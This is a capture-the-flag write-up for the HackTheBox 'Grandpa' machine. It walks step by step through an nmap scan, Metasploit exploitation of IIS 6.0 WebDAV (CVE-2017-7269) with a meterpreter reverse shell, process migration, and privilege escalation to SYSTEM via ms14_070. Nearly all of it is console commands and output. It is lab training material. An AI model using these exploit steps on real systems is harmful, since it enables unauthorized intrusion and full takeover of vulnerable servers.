# Grandpa-HTB
Grandpa is a Windows machine that is rated as easy. It covers the exploitation of CVE-2017-7269.
# Recon
I started by runing nmap scan on the box.
```
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -sC -sV 10.10.10.14             
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-01 14:33 EDT
Nmap scan report for 10.10.10.14
Host is up (0.030s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Server Date: Tue, 01 Sep 2020 18:36:17 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  Server Type: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.50 seconds
```
A small search on the service and version number will get you a shell:

![image1](https://github.com/electronicbots/HackTheBox/blob/master/Machines/Grandpa/images/1.png)

# User Flag
Here is the Metasploit module: ```exploit/windows/iis/iis_webdav_scstoragepathfromurl```
Set your own options:
```
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > options 

Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   MAXPATHLENGTH  60               yes       End of physical path brute force
   MINPATHLENGTH  3                yes       Start of physical path brute force
   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS         10.10.10.14      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          80               yes       The target port (TCP)
   SSL            false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI      /                yes       Path of IIS 6 web application
   VHOST                           no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.28      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Microsoft Windows Server 2003 R2 SP2 x86
```
After you set your data, just run it and you should get your shell:
```
[*] Started reverse TCP handler on 10.10.14.28:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (176195 bytes) to 10.10.10.14
[*] Meterpreter session 1 opened (10.10.14.28:4444 -> 10.10.10.14:1030) at 2020-09-01 14:43:59 -0400

meterpreter > sysinfo 
Computer        : GRANPA
OS              : Windows .NET Server (5.2 Build 3790, Service Pack 2).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 3
Meterpreter     : x86/windows
meterpreter >
```
If you drop a shell you can see who are you logged in to:
```
c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service
```
So we are logged in as ```network service```. So we can't access most of the files at the moment, let's see what ```local_exploit_suggester``` suggest.
```
meterpreter > background
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > use post/multi/recon/local_exploit_suggester
msf5 post(multi/recon/local_exploit_suggester) > options 

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf5 post(multi/recon/local_exploit_suggester) > set SESSION 1 
SESSION => 1
msf5 post(multi/recon/local_exploit_suggester) > exploit 

[*] 10.10.10.14 - Collecting local exploits for x86/windows...
[*] 10.10.10.14 - 34 exploit checks are being tried...
nil versions are discouraged and will be deprecated in Rubygems 4
[+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```
So there are many options, I tried most of them and only one worked for me and it is ```ms14_070_tcpip_ioctl```. Before that we need migrate to another process.
```
msf5 post(multi/recon/local_exploit_suggester) > sessions -i 1 
[*] Starting interaction with 1...

meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]                                                
 4     0     System                                                          
 272   4     smss.exe                                                        
 324   272   csrss.exe                                                       
 348   272   winlogon.exe                                                    
 396   348   services.exe                                                    
 408   348   lsass.exe                                                       
 600   396   svchost.exe                                                     
 684   396   svchost.exe                                                     
 740   396   svchost.exe                                                     
 768   396   svchost.exe                                                     
 804   396   svchost.exe                                                     
 940   396   spoolsv.exe                                                     
 968   396   msdtc.exe                                                       
 1088  396   cisvc.exe                                                       
 1128  396   svchost.exe                                                     
 1184  396   inetinfo.exe                                                    
 1220  396   svchost.exe                                                     
 1256  1088  cidaemon.exe                                                    
 1320  1088  cidaemon.exe                                                    
 1332  396   VGAuthService.exe                                               
 1412  396   vmtoolsd.exe                                                    
 1460  396   svchost.exe                                                     
 1604  396   svchost.exe                                                     
 1616  1088  cidaemon.exe                                                    
 1704  396   alg.exe                                                         
 1808  600   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 1920  396   dllhost.exe                                                     
 2308  600   wmiprvse.exe                                                    
 2660  348   logon.scr                                                       
 3000  1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 3072  600   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 3316  1460  w3wp.exe                                                        
 3520  3000  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
 3912  600   davcdata.exe                                                    

meterpreter > migrate 3072
[*] Migrating from 3520 to 3072...
[*] Migration completed successfully.
```
Note: 3072 is the PID of davcdata.exe, I used this one because it is runing under NT AUTHORITY\NETWORK SERVICE.

Let's get ```SYSTEM``` now:
```
msf5 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms14_070_tcpip_ioctl
msf5 exploit(windows/local/ms14_070_tcpip_ioctl) > options 

Module options (exploit/windows/local/ms14_070_tcpip_ioctl):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.28      yes       The listen address (an interface may be specified)
   LPORT     5555             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Server 2003 SP2
```
And now run it:
```
msf5 exploit(windows/local/ms14_070_tcpip_ioctl) > exploit 

[*] Started reverse TCP handler on 10.10.14.28:5555 
[*] Storing the shellcode in memory...
[*] Triggering the vulnerability...
[*] Checking privileges after exploitation...
[+] Exploitation successful!
[*] Sending stage (176195 bytes) to 10.10.10.14
[*] Meterpreter session 2 opened (10.10.14.28:5555 -> 10.10.10.14:1032) at 2020-09-01 14:56:50 -0400

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```
We are ```SYSTEM```. Drop a shell and get your flags:
```
meterpreter > shell 
Process 3504 created.
Channel 1 created.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\system32>
C:\Documents and Settings\Harry\Desktop>type user.txt
type user.txt
bdff5ec...6a5d869
```
# Root Flag
No need to do anything here just grab it with the same shell :)
```
C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
9359e905...ecf28bb7b
```
Thank you for reading, and you can find me here on twitter: https://twitter.com/electronicbots
